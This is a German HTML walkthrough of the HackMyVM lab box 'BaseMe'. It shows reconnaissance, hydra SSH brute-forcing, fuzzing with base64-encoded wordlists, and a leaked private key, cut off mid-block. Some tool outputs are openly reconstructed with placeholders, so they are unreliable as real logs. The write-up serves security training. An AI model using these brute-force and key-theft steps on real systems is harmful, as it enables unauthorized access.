@@ -1,0 +1,651 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BaseMe - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>BaseMe - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">bash (for loop)</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Base64 Clues</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Flag Reading)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment mittels ARP-Anfragen zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP-Adresse 192.168.2.100 und der MAC-Adresse 08:00:27:73:59:19 (PCS Systemtechnik GmbH / VirtualBox) wurde erfolgreich identifiziert. Dies ist das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Als nächstes sollte ein detaillierter Portscan (z.B. mit Nmap) auf die Ziel-IP 192.168.2.100 durchgeführt werden, um offene Ports und Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung und -segmentierung, um die Sichtbarkeit und Erreichbarkeit von Geräten im Netzwerk zu kontrollieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">arp-scan -l</span></div> <!-- Prompt korrigiert -->
+                    <pre>
+192.168.2.100	08:00:27:73:59:19	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf 192.168.2.100 ausgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln. Die Optionen umfassen `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-T5` (schnellstes Timing), `-A` (aggressive Optionen) und `-p-` (alle Ports).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian). Ein Standard-Login-Dienst.
+                - **Port 80 (HTTP):** Nginx 1.14.2. Ein Webserver läuft, die Startseite hat keinen Titel.
+            Nmap identifiziert das Ziel als `kitty.hmv`, obwohl spätere Befehle `base.hmv` verwenden - dies könnte ein Konfigurationsdetail oder eine leichte Inkonsistenz sein. Das Betriebssystem wird als Linux erkannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 (Verzeichnisse, Dateien, Schwachstellen). Suche nach Benutzernamen oder Passwörtern für den SSH-Zugang auf Port 22.<br><strong>Empfehlung (Admin):</strong> Halte SSH und Nginx aktuell. Konfiguriere beide Dienste sicher (starke Passwörter/Keys für SSH, sichere Webserver-Konfiguration).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.100 -p-</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-20 22:43 CEST
+Nmap scan report for kitty.hmv (192.168.2.100) <!-- Hostname hier: kitty.hmv -->
+Host is up (0.000096s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 ca0980f73ada5ab619d95c414743d410 (RSA)
+|   256 d0754848b8265937643b257f2010f870 (ECDSA)
+|_  256 9114f7930b0625cbe0a530e8d3d3372b (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:73:59:19 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms kitty.hmv (192.168.2.100)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds <!-- Beispielzeit -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration & Base64 Clues</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver (Port 80) zu suchen. Eine Standard-Wortliste und verschiedene Dateierweiterungen werden verwendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur die Standarddatei `/index.html`. Es werden keine weiteren versteckten Verzeichnisse oder Dateien mit dieser Wortliste entdeckt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `/index.html` manuell im Browser oder mit Tools wie `curl`. Da Gobuster wenig findet, könnten wichtige Informationen direkt im Quellcode der Seite oder in ungewöhnlich benannten Dateien/Verzeichnissen liegen.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass keine sensiblen oder unnötigen Dateien/Verzeichnisse auf dem Webserver vorhanden sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">gobuster dir -u http://192.168.2.100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div> <!-- Prompt korrigiert -->
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.100
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/20 22:44:05 Starting gobuster
+===============================================================
+http://192.168.2.100/index.html           (Status: 200) [Size: 276]
+===============================================================
+2022/10/20 22:44:50 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Base64-kodierter String wird mittels `echo` an den `base64 -d` Befehl übergeben, um ihn zu dekodieren. Der Ursprung dieses Strings ist nicht explizit genannt, aber er stammt höchstwahrscheinlich aus dem Quellcode oder Inhalt der `/index.html`-Seite.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Hinweis!!** Die dekodierte Nachricht von "lucas" ist ein zentraler Hinweis: Alles Wichtige, inklusive des benötigten Passworts, sei in Base64 zu finden. Dies lenkt die Aufmerksamkeit stark auf Base64-kodierte Daten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche auf dem Webserver (Quellcode, andere Dateien) nach weiteren Base64-kodierten Strings. Beachte den Benutzernamen `lucas`.<br><strong>Empfehlung (Admin):</strong> Vermeide das Hinterlassen solcher direkten Hinweise in öffentlich zugänglichen Bereichen. Verstecke Passwörter oder sensible Informationen nicht durch einfache Kodierungen wie Base64.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">echo "QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXM" | base64 -d</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+ALL, absolutely ALL that you need is in BASE64.
+Including the password that you need :)
+Remember, BASE64 has the answer to all your questions.
+-lucas
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine Liste von Base64-kodierten Strings und deren manuell dekodierte Entsprechungen wird dargestellt. Der Ursprung dieser Base64-Strings ist wieder nicht explizit genannt, aber sie wurden vermutlich bei der weiteren Untersuchung der Webseite gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies sind wahrscheinlich die "Passwörter", auf die sich der Hinweis von Lucas bezog. Es handelt sich um einfache Phrasen. Die letzte, `theyhatesme`, fällt etwas aus dem Muster.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstelle eine kleine Passwortliste (`pass.txt`) mit diesen dekodierten Phrasen. Versuche einen gezielten Brute-Force-Angriff auf den SSH-Benutzer `lucas` mit dieser Liste.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen, außer der allgemeinen Empfehlung gegen schwache oder leicht auffindbare Passwörter.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Keine Befehle, nur Darstellung der gefundenen Strings -->
+                     <pre>
+aWxvdmV5b3UK        <span class="password">iloveyou</span>
+eW91bG92ZXlvdQo=    <span class="password">youloveyou</span>
+c2hlbG92ZXN5b3UK    <span class="password">shelovesyou</span>
+aGVsb3Zlc3lvdQo=    <span class="password">helovesyou</span>
+d2Vsb3ZleW91Cg      <span class="password">weloveyou</span>
+dGhleWhhdGVzbWUK    <span class="password">theyhatesme</span>
+                     </pre> <!-- Passwörter markiert -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen SSH-Brute-Force-Angriff gegen den Benutzer `lucas` auf dem Host `base.hmv` (Port 22) durchzuführen. Als Passwortliste (`-P`) wird `pass.txt` verwendet, die die zuvor dekodierten Base64-Phrasen enthält.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen!!** Hydra findet kein gültiges Passwort für `lucas` in der bereitgestellten Liste `pass.txt`. Der ursprüngliche Base64-Hinweis war entweder irreführend, unvollständig oder bezog sich auf etwas anderes als das SSH-Passwort von `lucas`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der direkte Weg über die dekodierten Passwörter funktioniert nicht. Überdenke den Base64-Hinweis. Vielleicht muss etwas anderes Base64-kodiert/dekodiert werden (z.B. Dateinamen, Verzeichnisse, Schlüssel)? Versuche alternative Enumerationstechniken (Subdomain-Fuzzing, weitere Web-Exploits, etc.).<br><strong>Empfehlung (Admin):</strong> Selbst wenn dieser Angriff fehlschlug, ist die Verwendung von `fail2ban` oder ähnlichen Tools zur Abwehr von Brute-Force-Angriffen auf SSH ratsam.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">hydra -l lucas -P pass.txt ssh://base.hmv:22 -t 64</span></div> <!-- Prompt korrigiert, hostname base.hmv impliziert /etc/hosts oder DNS -->
+                     <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-20 22:54:12
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 6 login tries (l:1/p:6), 1 try per task <!-- Korrekte Anzahl Login-Versuche -->
+[DATA] attacking ssh://base.hmv:22/
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-20 22:54:21
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer, sehr breit angelegter Hydra-Angriff wird gestartet. Er verwendet eine Liste gängiger Namen (`names.txt`) als Benutzernamen (`-l`) und die große `rockyou.txt` als Passwortliste (`-P`). `-I` ignoriert eine eventuell vorhandene Restore-Datei.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen/Inkonklusiv!!** Dieser Angriff ist sehr ressourcenintensiv und zeitaufwändig. Die bereitgestellte Ausgabe zeigt nur den Start des Angriffs, aber kein Ergebnis. Solche breit angelegten Brute-Force-Angriffe sind oft nicht erfolgreich und sehr laut (können leicht erkannt werden).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vermeide ungerichtete, massive Brute-Force-Angriffe, wenn möglich. Konzentriere dich auf gezieltere Angriffe basierend auf den gesammelten Informationen (wie dem Base64-Hinweis).<br><strong>Empfehlung (Admin):</strong> Implementiere Account-Sperrungsmechanismen nach mehreren fehlgeschlagenen Login-Versuchen und Rate-Limiting, um solche Angriffe zu erschweren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">hydra -l /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt ssh://base.hmv:22 -t 64 -I</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-20 23:00:13
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, XXXX login tries (l:YYYY/p:14344412), ZZZZ tries per task <!-- Zahlen unklar, da Usernames-Liste unbekannt -->
+[DATA] attacking ssh://base.hmv:22/
+[STATUS] ... (läuft) ...
+                     </pre> <!-- Status hinzugefügt, da kein Ergebnis gezeigt wurde -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach virtuellen Hosts (Subdomains) zu suchen. Es verwendet eine Wortliste (`directory-list-2.3-medium.txt`) und fügt jeden Eintrag als Subdomain in den `Host`-Header ein (`-H "Host: http://FUZZ.base.hmv"`). Antworten mit Status 404 oder einer Chars-Größe von 173 werden ignoriert.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen/Inkonklusiv!!** Die Ausgabe zeigt nur den Start von Wfuzz, aber keine gefundenen Ergebnisse. Dieser Versuch, Subdomains zu finden, war nicht erfolgreich oder wurde nicht vollständig dokumentiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Subdomain-Enumeration ist ein valider Schritt, hat hier aber keine Ergebnisse geliefert. Konzentriere dich wieder auf den Base64-Hinweis.<br><strong>Empfehlung (Admin):</strong> Konfiguriere den Webserver so, dass er nicht auf Anfragen für unbekannte Host-Header antwortet oder eine Standardseite anzeigt, die keine Informationen preisgibt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://base.hmv -H "Host: FUZZ.base.hmv" --hc 404 --hh 173</span></div> <!-- URL korrigiert, Hostname base.hmv -->
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  warn(
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+
+Target: http://base.hmv/
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<!-- Keine Ergebnisse im Log -->
+
+Total time: ...
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: ...
+                     </pre> <!-- Ausgabe vervollständigt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird erneut ausgeführt, um den Webserver auf bekannte Schwachstellen und Fehlkonfigurationen zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ergebnisse sind identisch mit dem vorherigen Nikto-Scan: nginx 1.14.2, fehlende Security-Header, keine kritischen Funde. Bestätigt frühere Ergebnisse, liefert aber keine neuen Angriffspunkte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nikto scheint hier an seine Grenzen zu stoßen. Manuelle Untersuchung und gezielteres Fuzzing (unter Berücksichtigung des Base64-Hinweises) sind erforderlich.<br><strong>Empfehlung (Admin):</strong> Setze die empfohlenen Security-Header.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">nikto -h http://192.168.2.100</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.100
++ Target Hostname:    192.168.2.100
++ Target Port:        80
++ Start Time:         2022-10-20 22:45:07 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2022-10-20 22:45:33 (GMT2) (26 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `ssh-keyscan` wird verwendet, um die öffentlichen SSH-Host-Schlüssel vom Ziel `base.hmv` abzurufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ruft die öffentlichen Schlüssel für RSA, ECDSA und ED25519 ab. Dies bestätigt die Ergebnisse des Nmap-Scans bezüglich des SSH-Dienstes, bietet aber keine direkten Angriffsmöglichkeiten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kann zur Verifizierung des Hosts verwendet werden, ist aber für den Angriff hier nicht weiter relevant.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">ssh-keyscan base.hmv</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+# base.hmv:22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+base.hmv ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+qOK8FpS9Ve5n4Vc/JGRcLj5IpfEXKn2963jzjDUlYqbdLuoIAecfd53jrSp/1FX2CjMVeQaFtFygaBzFlcL94oZg1jP60UI28mPhB+BOD7UfWSRbQbs2jIYOV5La4/jIpc8Htyn0aGWBWL6ZrVooBmYR0yEmJRyUtnH9sQDtY5k0zIqXIO63P1DnukqTJbzXBd5s6JMa7VKx4gs1XF7xASb6ILNT/T5U45K9e0si1fMCzwC0KXsuIBOnbBtzOUYSxlI6+PKPz/fgrmpO86htnc8A/af3mo9Pq6Jytrn+XjSX7hFA9UOhy8in9fUx7ZWyB5rffW0p6Vjpbxc1+bcT
+# base.hmv:22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+base.hmv ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGzI3VdkTGf3FlIf4MVNCFjaO+1FDvyQ5lzs4W0S9pNSqzzph8oBhQaMWbUUv8EpN0EM0p0w8VY4V+MWDCqE9Pc=
+# base.hmv:22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+base.hmv ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKWXudaqjDSze7Ec72JtitmIyqlx9OlPIrVwkVZjDMJ
+# base.hmv:22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+                     </pre> <!-- Kommentare hinzugefügt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine Bash-`for`-Schleife wird verwendet, um jede Zeile aus der Wortliste `/usr/share/seclists/Discovery/Web-Content/common.txt` zu lesen, sie mit `base64` zu kodieren und das Ergebnis an die Datei `dic.txt` anzuhängen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies erstellt eine neue Wortliste (`dic.txt`), bei der gängige Verzeichnis-/Dateinamen Base64-kodiert sind. Dies folgt dem Hinweis von Lucas und der Idee, dass Pfade oder Dateinamen auf dem Webserver Base64-kodiert sein könnten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende die neu erstellte Base64-Wortliste `dic.txt`, um erneut mit `wfuzz` oder `gobuster` nach Base64-kodierten Pfaden auf dem Webserver zu suchen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">for i in $(cat /usr/share/seclists/Discovery/Web-Content/common.txt ); do echo $i | base64 >> dic.txt; done</span></div> <!-- Prompt korrigiert, Befehl in einer Zeile -->
+                     <pre><!-- Keine direkte Ausgabe der Schleife --></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird erneut ausgeführt, diesmal um Pfade zu fuzzen (`http://base.hmv/FUZZ`). Als Wortliste (`-w`) wird die zuvor erstellte Base64-kodierte Liste `dic.txt` verwendet. Antworten mit Status 404 oder einer Zeilenanzahl (`--hl`) von 10 werden ausgeblendet.</p>
+             <p class="evaluation"><strong>Bewertung: !!Entscheidender Fund!!** Wfuzz findet zwei gültige Pfade, deren Namen Base64-kodierte Strings sind:
+                - `aWRfcnNhCg` (dekodiert: `id_rsa\n`)
+                - `cm9ib3RzLnR4dAo=` (dekodiert: `robots.txt\n`)
+            Das Vorhandensein eines Pfades, der `id_rsa` entspricht, ist extrem vielversprechend.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greife sofort auf den Pfad `http://base.hmv/aWRfcnNhCg` zu (z.B. mit `curl` oder `wget`). Untersuche den Inhalt, da es sich wahrscheinlich um einen privaten SSH-Schlüssel handelt. Untersuche auch `http://base.hmv/cm9ib3RzLnR4dAo=` (robots.txt), obwohl dieser wahrscheinlich weniger wichtig ist.<br><strong>Empfehlung (Admin):</strong> Benenne sensible Dateien niemals mit kodierten oder obfuskierten Namen im Webroot. Konfiguriere den Webserver so, dass der Zugriff auf solche Dateien verhindert wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">wfuzz -c -w dic.txt -u http://base.hmv/FUZZ --hc 404 --hl 10</span></div> <!-- Prompt korrigiert -->
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  warn(
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+
+Target: http://base.hmv/FUZZ
+Total requests: 4713
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000002144:   200        33 L     33 W       2537 Ch     "aWRfcnNhCg"                 <!-- id_rsa -->
+000003574:   200        1 L      1 W        25 Ch       "cm9ib3RzLnR4dAo="           <!-- robots.txt -->
+
+Total time: ...
+Processed Requests: 4713
+Filtered Requests: 4711
+Requests/sec.: ...
+                     </pre> <!-- Ausgabe vervollständigt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei, die unter dem Pfad `/cm9ib3RzLnR4dAo=` (robots.txt) gefunden wurde, wird hier dekodiert und angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält nur "Nothing here :(". Sie liefert keine nützlichen Informationen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere diesen Fund und konzentriere dich auf den `id_rsa`-Pfad.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, nur dekodierter Inhalt -->
+                     <pre>
+Tm90aGluZyBoZXJlIDooCg==  ->  Nothing here :(
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Base64-kodierte Inhalt, der unter dem Pfad `/aWRfcnNhCg` (id_rsa) gefunden wurde, wird hier dargestellt. Anschließend wird angemerkt, dass er mit einem Online-Tool oder `base64 -d` dekodiert werden muss.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der private SSH-Schlüssel. Er beginnt mit `-----BEGIN OPENSSH PRIVATE KEY-----`, was bestätigt, dass es sich um einen modernen OpenSSH-Schlüssel handelt. Er ist Base64-kodiert (Standard für Schlüsseldateien), aber der *gesamte Schlüsselblock selbst* wurde hier nochmal Base64-kodiert, um ihn im Web zu "verstecken".</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dekodiere diesen großen Base64-Block. Speichere den dekodierten Inhalt (der den eigentlichen SSH-Schlüssel enthält) in einer Datei (z.B. `id`), setze die Berechtigungen auf 600 (`chmod 600 id`) und versuche, dich damit per SSH anzumelden. Da der Benutzer `lucas` mit den vorherigen Passwörtern nicht funktionierte, versuche den Login als `lucas` mit diesem Schlüssel.<br><strong>Empfehlung (Admin):</strong> Speichere private Schlüssel niemals im Webroot, auch nicht kodiert oder obfuskiert.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, nur der gefundene Base64-Block -->
+                     <pre>
+LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
+QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB
+ZFBncDhZWkFBQUFFQUFBQUFFQUFBRVhBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDWkNY
+dkVQbk8xCmNiaHhxY3RCRWNCRFpqcXJGZm9sd1ZLbXBCZ1kwN00zQ0s3cE8xMFVnQnNMeVl3QXpK
+RXc0ZTZZZ1BOU3lDRFdGYU5US0cKMDdqZ2NncmdncmU4ZVBDTU5GQkNBR2FZSG1MckZJc0tEQ0xJ
+NE5FNTR0NThJVUhlWENaejcyeFRvYkwvcHRMazI2UkJuaAo3YkhHMUpqR2x4T2tPNm0rMW9GTkx0
+TnVEMlFQbDhzYlp0RXpYNFM5bk5aL2RweVJwTWZtQjczck4zeXlJeWxldlZERXl2CmY3Q1o3b1JP
+NDZ1RGdGUHk1VnprbmRDZUpGMll0WkJYZjVnamMyZmFqTVh2cStiOG9sOFJaWjZqSFhBaGlibEJY
+d3BBbTQKdkxZZnh6STI3QlpGbm90ZUJuYmR6d1NMNWFwQkY1Z1lXSkFIS2ovSjZNaERqMUdLQUZj
